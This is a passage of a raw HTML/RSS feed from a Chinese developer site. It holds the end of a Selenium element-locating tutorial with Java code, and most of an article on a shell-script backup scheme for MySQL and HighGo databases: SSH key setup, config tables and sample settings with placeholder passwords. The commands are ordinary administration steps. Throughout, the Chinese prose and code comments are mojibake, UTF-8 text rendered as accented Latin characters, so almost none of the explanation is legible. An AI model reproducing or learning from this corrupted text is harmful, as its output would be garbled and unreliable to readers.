<p>ç°ä»£é¡µé¢å¾€å¾€åµŒå¥—ææ·±ï¼Œç›´æ¥å†™ä¸€ä¸ªé•¿é•¿çš„Â <code>div/div/div/ul/li/a</code>Â ä¸ä»…éš¾çœ‹ï¼Œè€Œä¸”ä¸€æ—¦çˆ¶çº§ç»“æ„å¾®è°ƒå°±ä¼šå¤±æ•ˆã€‚Selenium 3 å…è®¸æˆ‘ä»¬å…ˆå®šä½çˆ¶å®¹å™¨ï¼Œå†åœ¨çˆ¶å®¹å™¨å†…è¿›è¡Œå­æŸ¥æ‰¾ï¼Œæ—¢æé«˜äº†å¯è¯»æ€§ï¼Œåˆæé«˜äº†æ€§èƒ½ã€‚</p>
<h4 data-id="heading-6">åœºæ™¯ï¼šå¤šçº§èœå•æ“ä½œ</h4>
<p>java</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-ini" lang="ini">public class HierarchicalSearchDemo {
    public static void main(String<span class="hljs-section">[]</span> args) {
        WebDriver <span class="hljs-attr">driver</span> = new ChromeDriver()<span class="hljs-comment">;</span>
        driver.get("https://example.com/dashboard") <span class="hljs-comment">;</span>

        // ç¬¬ä¸€æ­¥ï¼šå…ˆå®šä½åˆ°ä¾§è¾¹æ èœå•ï¼ˆçˆ¶å®¹å™¨ï¼‰
        // è¿™æ ·å¯ä»¥å‡å°‘å…¨å±€æœç´¢èŒƒå›´
        WebElement <span class="hljs-attr">sidebar</span> = driver.findElement(By.id(<span class="hljs-string">"sidebar-menu"</span>))<span class="hljs-comment">;</span>

        // ç¬¬äºŒæ­¥ï¼šåœ¨çˆ¶å®¹å™¨å†…æŸ¥æ‰¾å­å…ƒç´ ï¼ˆå­çº§æŸ¥æ‰¾ï¼‰
        // è¿™é‡Œçš„æŸ¥æ‰¾èŒƒå›´è¢«é™åˆ¶åœ¨äº† sidebar å†…éƒ¨ï¼Œä¸ä¼šè¯¯è§¦ Header é‡Œçš„åŒåå…ƒç´ 
        WebElement <span class="hljs-attr">systemMenu</span> = sidebar.findElement(By.linkText(<span class="hljs-string">"ç³»ç»Ÿç®¡ç†"</span>))<span class="hljs-comment">;</span>

        // é¼ æ ‡æ‚¬åœè§¦å‘ä¸‹æ‹‰
        Actions <span class="hljs-attr">actions</span> = new Actions(driver)<span class="hljs-comment">;</span>
        actions.moveToElement(systemMenu).perform()<span class="hljs-comment">;</span>

        // ç¬¬ä¸‰æ­¥ï¼šæŸ¥æ‰¾å…„å¼Ÿçº§å…ƒç´ ï¼ˆä¸‹æ‹‰èœå•ï¼‰
        // åœ¨ systemMenu çš„çˆ¶çº§ä¸‹ï¼ŒæŸ¥æ‰¾æ˜¾ç¤ºå‡ºæ¥çš„å­èœå•
        WebElement <span class="hljs-attr">userManage</span> = driver.findElement(
            By.xpath("//a<span class="hljs-section">[contains(text(), 'ç³»ç»Ÿç®¡ç†')]</span>/following-sibling::ul//a<span class="hljs-section">[text()='ç”¨æˆ·ç®¡ç†']</span>")
        )<span class="hljs-comment">;</span>
        
        userManage.click()<span class="hljs-comment">;</span>
        
        driver.quit()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-7">å››ã€ æ€»ç»“</h3>
<p>Selenium 3 çš„å®šä½èƒ½åŠ›ä¹‹æ‰€ä»¥å¼ºå¤§ï¼Œä¸ä»…ä»…æ˜¯å› ä¸ºå®ƒæ”¯æŒ 8 ç§åŸºç¡€å®šä½ç­–ç•¥ï¼Œæ›´åœ¨äºå®ƒæ”¯æŒè¿™äº›ç­–ç•¥çš„<strong>ç»„åˆä½¿ç”¨</strong>ã€‚</p>
<ul>
<li><strong>CSS Selector</strong>Â é€‚åˆå¤„ç†æ ·å¼ç›¸å…³çš„ã€åŠ¨æ€ Class çš„åœºæ™¯ï¼Œè¯­æ³•ç®€æ´ã€‚</li>
<li><strong>XPath</strong>Â æ˜¯å¤„ç†å¤æ‚é€»è¾‘ã€æ–‡æœ¬åŒ¹é…ã€å±‚çº§ç»“æ„çš„ç»ˆææ­¦å™¨ï¼Œç‰¹åˆ«æ˜¯å®ƒçš„<strong>è½´å®šä½</strong>åŠŸèƒ½ï¼Œå‡ ä¹èƒ½åº”å¯¹ä»»ä½•å˜æ€çš„ DOM ç»“æ„ã€‚</li>
</ul>
<p>åœ¨é¢è¯•æˆ–å®é™…å·¥ä½œä¸­ï¼Œå½“è‡ªåŠ¨åŒ–è„šæœ¬å› ä¸ºâ€œæ‰¾ä¸åˆ°å…ƒç´ â€è€Œå¤±è´¥æ—¶ï¼Œå¾€å¾€æ˜¯å¼€å‘è€…æ²¡æœ‰å……åˆ†åˆ©ç”¨ Selenium 3 æä¾›çš„è¿™äº›é«˜çº§å®šä½èƒ½åŠ›ã€‚æŒæ¡å®ƒä»¬ï¼Œä½ å°±èƒ½è½»æ¾åº”å¯¹ä»»ä½•å¤æ‚çš„ Web é¡µé¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL/ç€šé«˜åŒæœºå†·å¤‡Shellè„šæœ¬ï¼ˆæ”¯æŒdockerå®¹å™¨ï¼‰]]></title>    <link>https://juejin.cn/post/7596991930985938995</link>    <guid>https://juejin.cn/post/7596991930985938995</guid>    <pubDate>2026-01-20T10:22:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596991930985938995" data-draft-id="7597125475601481755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL/ç€šé«˜åŒæœºå†·å¤‡Shellè„šæœ¬ï¼ˆæ”¯æŒdockerå®¹å™¨ï¼‰"/> <meta itemprop="keywords" content="åç«¯,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-20T10:22:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="roc98"/> <meta itemprop="url" content="https://juejin.cn/user/677759452188541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL/ç€šé«˜åŒæœºå†·å¤‡Shellè„šæœ¬ï¼ˆæ”¯æŒdockerå®¹å™¨ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/677759452188541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    roc98
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:22:03.000Z" title="Tue Jan 20 2026 10:22:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬ç¯‡ä¸ºå†å²æ–‡æ¡£çš„å‡çº§ç‰ˆæœ¬ï¼Œæ”¯æŒç€šé«˜ï¼Œæ”¯æŒåŠ¨æ€é…ç½®ä¿¡æ¯ï¼Œå‚»ç“œå¼ä½¿ç”¨ã€‚æœ¬æ–‡æ’°å†™å¤§é‡å‚è€ƒAIç»™å‡ºçš„å»ºè®®ã€‚</p>
<p>æœ¬æ–‡è„šæœ¬æ”¾åœ¨æœ€åï¼Œå¦‚æœæ‚¨æƒ³ç›´æ¥é˜…è¯»è„šæœ¬ï¼Œè¯·ç›´æ¥ç¿»é˜…è‡³æœ€åã€‚</p>
<p><a href="https://juejin.cn/post/7121955767866884104" target="_blank" title="https://juejin.cn/post/7121955767866884104">shellè„šæœ¬å®ç°mysqlæ•°æ®åº“åŒæœºå®šæ—¶å¤‡ä»½</a></p>
</blockquote>
<h2 data-id="heading-0">1. æ–¹æ¡ˆæ¦‚è¿°</h2>
<p>æœ¬å¥—è„šæœ¬æ—¨åœ¨ä¸º <strong>MySQL</strong> å’Œ <strong>HighGo (ç€šé«˜)</strong> æ•°æ®åº“æä¾›ç®€å•ã€ä½æˆæœ¬çš„<strong>å…¨é‡å†·å¤‡</strong>æ–¹æ¡ˆã€‚æ”¯æŒç‰©ç†æœºç›´æ¥éƒ¨ç½²å’Œ <strong>Docker å®¹å™¨åŒ–</strong>éƒ¨ç½²ï¼Œå¹¶å¯çµæ´»é€‰æ‹©<strong>å•æœºæœ¬åœ°å¤‡ä»½</strong>æˆ–<strong>åŒæœºå¼‚åœ°å®¹ç¾</strong>ã€‚</p>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒæµç¨‹å›¾</h3>
<pre><code class="hljs language-scss" lang="scss">Â +----------------+ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   +----------------+
Â |  ä¸»æœåŠ¡å™¨ (A) Â  | Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   |  ä»æœåŠ¡å™¨ (B) Â  |
Â | (Script: Master)| Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   | (Script: Slave)|
Â +--------+-------+ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   +--------+-------+
Â  Â  Â  Â  Â  | Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  |
Â  Â   <span class="hljs-number">1</span>. å¯¼å‡ºæ•°æ® (mysqldump/pg_dump) Â  Â  Â  Â  Â  Â  Â  Â   |
Â  Â  Â  Â  Â  | Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  |
Â  Â   <span class="hljs-number">2</span>. æµå¼å‹ç¼© (.sql.gz) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   |
Â  Â  Â  Â  Â  | Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  |
Â  Â   <span class="hljs-number">3</span>. ä¼ è¾“æ–‡ä»¶ (SSH/SCP) <span class="hljs-selector-attr">[å¯é€‰æ­¥éª¤]</span> -----------&gt;  <span class="hljs-number">4</span>. æ¥æ”¶æ–‡ä»¶
Â  Â   (è‹¥é…ç½®äº† SLAVE_IP åˆ™ä¼ è¾“ï¼Œå¦åˆ™è·³è¿‡) Â  Â  Â  Â  Â  Â  Â   |
Â  Â  Â  Â  Â  | Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  |
Â  Â   <span class="hljs-number">5</span>. æ¸…ç† <span class="hljs-selector-tag">A</span> æœ¬åœ°æ—§å¤‡ä»½ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   <span class="hljs-number">6</span>. æ¸…ç† <span class="hljs-selector-tag">B</span> æœ¬åœ°æ—§å¤‡ä»½
Â  Â   (åŸºäºæ–‡ä»¶åæ—¥æœŸçš„ç²¾å‡†æ¸…ç†) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  (åŸºäºæ–‡ä»¶åæ—¥æœŸçš„ç²¾å‡†æ¸…ç†)
</code></pre>
<h3 data-id="heading-2">1.2 åŠŸèƒ½äº®ç‚¹</h3>
<ul>
<li><strong>çµæ´»éƒ¨ç½²</strong>ï¼š<strong>æ”¯æŒå•æœºæ¨¡å¼ï¼</strong> å¦‚æœä¸é…ç½®ä»æœåŠ¡å™¨ IPï¼Œè„šæœ¬ä»…æ‰§è¡Œæœ¬åœ°å¤‡ä»½å’Œæ¸…ç†ã€‚</li>
<li><strong>é›¶ä¾èµ–</strong>ï¼šæ”¯æŒ Docker æ¨¡å¼ï¼Œå®¿ä¸»æœº<strong>æ— éœ€å®‰è£…</strong>ä»»ä½•æ•°æ®åº“å®¢æˆ·ç«¯å·¥å…·ï¼ˆå¦‚ <code>mysql</code> æˆ– <code>psql</code>ï¼‰ï¼Œè„šæœ¬ç›´æ¥ç©¿é€å®¹å™¨æ‰§è¡Œã€‚</li>
<li><strong>é€šç”¨æ€§å¼º</strong>ï¼šä¸€å¥—è„šæœ¬åŒæ—¶æ”¯æŒ MySQL å’Œ HighGoï¼Œé€šè¿‡é…ç½®åˆ‡æ¢ã€‚</li>
<li><strong>å®‰å…¨æ€§é«˜</strong>ï¼šè‹¥å¯ç”¨åŒæœºæ¨¡å¼ï¼Œæ”¯æŒ SSH å…å¯†äº’ä¿¡ï¼Œè„šæœ¬ä¸­æ— éœ€æ˜æ–‡å­˜å‚¨ Linux ç³»ç»Ÿå¯†ç ã€‚</li>
<li><strong>èŠ‚çœç©ºé—´</strong>ï¼šå¯¼å‡ºè¿‡ç¨‹ç›´æ¥ç»è¿‡ gzip å‹ç¼©ï¼Œä¸å ç”¨ä¸´æ—¶ç£ç›˜ç©ºé—´ã€‚</li>
</ul>
<h2 data-id="heading-3">2. éƒ¨ç½²å‰ç½®æ¡ä»¶ (ä»…åŒæœºæ¨¡å¼éœ€è¦)</h2>
<p><strong>âš ï¸ å¦‚æœæ‚¨åªè¿›è¡Œå•æœºæœ¬åœ°å¤‡ä»½ï¼Œå¯ç›´æ¥è·³è¿‡æœ¬èŠ‚ã€‚</strong></p>
<p>è‹¥éœ€è¦å°†å¤‡ä»½ä¼ è¾“åˆ°å¼‚åœ°ä»æœåŠ¡å™¨ï¼Œå¿…é¡»é…ç½® SSH å…å¯†ç™»å½•ã€‚</p>
<h3 data-id="heading-4">2.1 ç¯å¢ƒå‡è®¾</h3>
<ul>
<li><strong>ä¸»æœåŠ¡å™¨ (Master)</strong> IP: <code>192.168.1.10</code></li>
<li><strong>ä»æœåŠ¡å™¨ (Slave)</strong> IP: <code>192.168.1.200</code></li>
</ul>
<h3 data-id="heading-5">2.2 é…ç½®å…å¯†äº’ä¿¡ (äºŒé€‰ä¸€)</h3>
<h4 data-id="heading-6">æ–¹æ¡ˆ Aï¼šè‡ªåŠ¨é…ç½® (æ¨èï¼Œéœ€çŸ¥æ™“ä»æœºå¯†ç )</h4>
<p>åœ¨ <strong>ä¸»æœåŠ¡å™¨</strong> ä¸Šæ‰§è¡Œï¼š</p>
<ol>
<li>ç”Ÿæˆå¯†é’¥ï¼ˆå¦‚æœå·²ç»ç”Ÿæˆå¯ä»¥è·³è¿‡ï¼‰ï¼š<code>ssh-keygen -t rsa</code> (ä¸€è·¯å›è½¦)</li>
<li>ä¸‹å‘å…¬é’¥ï¼š<code>ssh-copy-id root@192.168.1.200</code></li>
<li><strong>éªŒè¯</strong>ï¼š<code>ssh root@192.168.1.200</code> (æ— éœ€å¯†ç å³æˆåŠŸ)</li>
</ol>
<h4 data-id="heading-7">æ–¹æ¡ˆ Bï¼šæ‰‹åŠ¨é…ç½® (æ— éœ€å¯†ç ï¼Œé€‚åˆäº‘å¹³å°)</h4>
<ol>
<li><strong>ä¸»æœåŠ¡å™¨</strong>ï¼šç”Ÿæˆå¯†é’¥ï¼ˆå¦‚æœå·²ç»ç”Ÿæˆå¯ä»¥è·³è¿‡ï¼‰<code>ssh-keygen -t rsa</code> (ä¸€è·¯å›è½¦)</li>
<li><strong>ä¸»æœåŠ¡å™¨</strong>ï¼š<code>cat ~/.ssh/id_rsa.pub</code> å¹¶å¤åˆ¶å†…å®¹ã€‚</li>
<li><strong>ä»æœåŠ¡å™¨</strong>ï¼šç¼–è¾‘ <code>~/.ssh/authorized_keys</code>ï¼Œç²˜è´´å…¬é’¥å†…å®¹ã€‚</li>
<li><strong>ä»æœåŠ¡å™¨</strong>ï¼šæ‰§è¡Œ <code>chmod 600 ~/.ssh/authorized_keys</code> (è‡³å…³é‡è¦)ã€‚</li>
</ol>
<h2 data-id="heading-8">3. å®‰è£…ä¸ç›®å½•ç»“æ„</h2>
<p>å»ºè®®åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºç»Ÿä¸€ç›®å½•ï¼š</p>
<ol start="0">
<li>
<p><strong>åˆ›å»ºç›®å½•</strong>ï¼š<code>mkdir -p /opt/db_backup</code></p>
</li>
<li>
<p><strong>ä¸Šä¼ æ–‡ä»¶</strong>ï¼šå°† <code>db_backup.sh</code> å’Œ <code>db_backup.conf</code> ä¸Šä¼ è‡³è¯¥ç›®å½•ã€‚</p>
</li>
<li>
<p><strong>èµ‹äºˆæƒé™</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Â <span class="hljs-built_in">chmod</span> +x /opt/db_backup/db_backup.sh
Â <span class="hljs-built_in">chmod</span> 600 /opt/db_backup/db_backup.conf
</code></pre>
</li>
</ol>
<h2 data-id="heading-9">4. é…ç½®æ–‡ä»¶è¯¦è§£ (<code>db_backup.conf</code>)</h2>
<h3 data-id="heading-10">4.1 åŸºç¡€å‚æ•° (æ‰€æœ‰åœºæ™¯é€šç”¨)</h3>






























<table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>ç¤ºä¾‹</strong></th></tr></thead><tbody><tr><td><code>SCRIPT_ROLE</code></td><td><strong>è„šæœ¬è§’è‰²</strong>ã€‚ <code>MASTER</code>: æ‰§è¡Œå¤‡ä»½ (+ä¼ è¾“) + æ¸…ç† <code>SLAVE</code>: ä»…æ‰§è¡Œæ¸…ç† (ä»åº“ç”¨)</td><td><code>"MASTER"</code></td></tr><tr><td><code>DB_TYPE</code></td><td><strong>æ•°æ®åº“ç±»å‹</strong>ã€‚æ”¯æŒ <code>MYSQL</code> æˆ– <code>HIGHGO</code></td><td><code>"MYSQL"</code></td></tr><tr><td><code>BACKUP_DIR</code></td><td><strong>å®¿ä¸»æœº</strong>å¤‡ä»½æ–‡ä»¶å­˜å‚¨è·¯å¾„</td><td><code>"/data/backup"</code></td></tr><tr><td><code>LOG_FILE</code></td><td>æ—¥å¿—æ–‡ä»¶è·¯å¾„</td><td><code>"/var/log/db_backup.log"</code></td></tr></tbody></table>
<h3 data-id="heading-11">4.2 åœºæ™¯åŒ–é…ç½® (é‡ç‚¹ï¼šDocker è®¾ç½®)</h3>
<h4 data-id="heading-12">ğŸ³ åœºæ™¯ä¸€ï¼šæ•°æ®åº“è¿è¡Œåœ¨ Docker å®¹å™¨ä¸­</h4>
<p>è¿™æ˜¯ç›®å‰æœ€å¸¸è§çš„éƒ¨ç½²æ–¹å¼ã€‚</p>

















<table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>é…ç½®è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong><code>DOCKER_CONTAINER_NAME</code></strong></td><td><strong>å¡«å†™å®¹å™¨åç§°æˆ–å®¹å™¨ ID</strong> (ä¾‹å¦‚ <code>"mysql_prod"</code>)ã€‚ âš ï¸ <strong>åªè¦æ­¤é¡¹ä¸ä¸ºç©ºï¼Œè„šæœ¬å°±ä¼šå¯ç”¨ Docker æ¨¡å¼ã€‚</strong></td></tr><tr><td><code>DB_HOST</code></td><td><strong>å¿…é¡»å¡« <code>127.0.0.1</code></strong> (å› ä¸ºå‘½ä»¤æ˜¯åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œçš„)ã€‚</td></tr></tbody></table>
<h4 data-id="heading-13">ğŸ’» åœºæ™¯äºŒï¼šæ•°æ®åº“ç›´æ¥å®‰è£…åœ¨å®¿ä¸»æœº</h4>

















<table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>é…ç½®è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong><code>DOCKER_CONTAINER_NAME</code></strong></td><td><strong>å¿…é¡»ç•™ç©º</strong> (<code>""</code>)ã€‚</td></tr><tr><td><code>DB_HOST</code></td><td>å¡«å†™ <code>127.0.0.1</code> æˆ–æœ¬æœº IPã€‚</td></tr></tbody></table>
<h3 data-id="heading-14">4.3 ä¼ è¾“é…ç½® (ä»… Master éœ€è¦)</h3>
<p><strong>âš ï¸ å•æœº/åŒæœºæ¨¡å¼åˆ‡æ¢å¼€å…³</strong></p>

























<table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong><code>SLAVE_IP</code></strong></td><td><strong>å…³é”®å¼€å…³</strong>ã€‚ 1. <strong>å¼€å¯åŒæœºå¤‡ä»½</strong>ï¼šå¡«å†™ä»æœåŠ¡å™¨ IP (å¦‚ <code>"192.168.1.200"</code>)ã€‚ 2. <strong>ä»…å•æœºå¤‡ä»½</strong>ï¼š<strong>ç•™ç©º</strong> (å³ <code>SLAVE_IP=""</code>)ï¼Œè„šæœ¬å°†è·³è¿‡ä¼ è¾“æ­¥éª¤ã€‚</td></tr><tr><td><code>SLAVE_USER</code></td><td>SSH ç”¨æˆ·å (é€šå¸¸ root)</td></tr><tr><td><code>SLAVE_PORT</code></td><td>SSH ç«¯å£ (é€šå¸¸ 22)</td></tr><tr><td><code>SLAVE_DEST_DIR</code></td><td>ä»æœåŠ¡å™¨æ¥æ”¶æ–‡ä»¶çš„è·¯å¾„</td></tr></tbody></table>
<h2 data-id="heading-15">5. é…ç½®ç¤ºä¾‹é€ŸæŸ¥</h2>
<h3 data-id="heading-16">ç¤ºä¾‹ Aï¼šMySQL Docker ç‰ˆ (å•æœºå¤‡ä»½)</h3>
<pre><code class="hljs language-ini" lang="ini">Â <span class="hljs-attr">SCRIPT_ROLE</span>=<span class="hljs-string">"MASTER"</span>
Â <span class="hljs-attr">DB_TYPE</span>=<span class="hljs-string">"MYSQL"</span>
Â <span class="hljs-attr">DOCKER_CONTAINER_NAME</span>=<span class="hljs-string">"mysql-container-v1"</span> <span class="hljs-comment"># Docker æ¨¡å¼</span>
Â â€‹
Â <span class="hljs-attr">DB_HOST</span>=<span class="hljs-string">"127.0.0.1"</span>
Â <span class="hljs-attr">DB_PORT</span>=<span class="hljs-string">"3306"</span>
Â <span class="hljs-attr">DB_USER</span>=<span class="hljs-string">"root"</span>
Â <span class="hljs-attr">DB_PASS</span>=<span class="hljs-string">"123456"</span>
Â <span class="hljs-attr">DB_LIST</span>=<span class="hljs-string">"order_db"</span>
Â â€‹
Â <span class="hljs-attr">SLAVE_IP</span>=<span class="hljs-string">""</span>  <span class="hljs-comment"># &lt;--- ç•™ç©ºï¼Œè¡¨ç¤ºä¸ä¼ è¾“ï¼Œä»…æœ¬åœ°å¤‡ä»½</span>
Â <span class="hljs-attr">MASTER_KEEP_DAYS</span>=<span class="hljs-number">7</span>
</code></pre>
<h3 data-id="heading-17">ç¤ºä¾‹ Bï¼šHighGo (ç€šé«˜) ç‰©ç†æœºç‰ˆ (åŒæœºäº’å¤‡)</h3>
<pre><code class="hljs language-ini" lang="ini">Â <span class="hljs-attr">SCRIPT_ROLE</span>=<span class="hljs-string">"MASTER"</span>
Â <span class="hljs-attr">DB_TYPE</span>=<span class="hljs-string">"HIGHGO"</span>
Â <span class="hljs-attr">DOCKER_CONTAINER_NAME</span>=<span class="hljs-string">""</span> <span class="hljs-comment"># ç‰©ç†æœºæ¨¡å¼</span>
Â â€‹
Â <span class="hljs-attr">DB_HOST</span>=<span class="hljs-string">"localhost"</span>
Â <span class="hljs-attr">DB_PORT</span>=<span class="hljs-string">"5866"</span>
Â <span class="hljs-attr">DB_USER</span>=<span class="hljs-string">"sysdba"</span>
Â <span class="hljs-attr">DB_PASS</span>=<span class="hljs-string">"Highgo@123"</span>
Â <span class="hljs-attr">DB_LIST</span>=<span class="hljs-string">"highgo_test"</span>
Â â€‹
Â <span class="hljs-attr">SLAVE_IP</span>=<span class="hljs-string">"192.168.1.200"</span> <span class="hljs-comment"># &lt;--- é…ç½® IPï¼Œå¼€å¯ä¼ è¾“</span>
Â <span class="hljs-attr">SLAVE_DEST_DIR</span>=<span class="hljs-string">"/data/backup"</span>
</code></pre>
<h2 data-id="heading-18">6. å®šæ—¶ä»»åŠ¡ (Crontab)</h2>
<p>ä½¿ç”¨ <code>crontab -e</code> æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€‚</p>
<h3 data-id="heading-19">ä¸»æœåŠ¡å™¨ (Master)</h3>
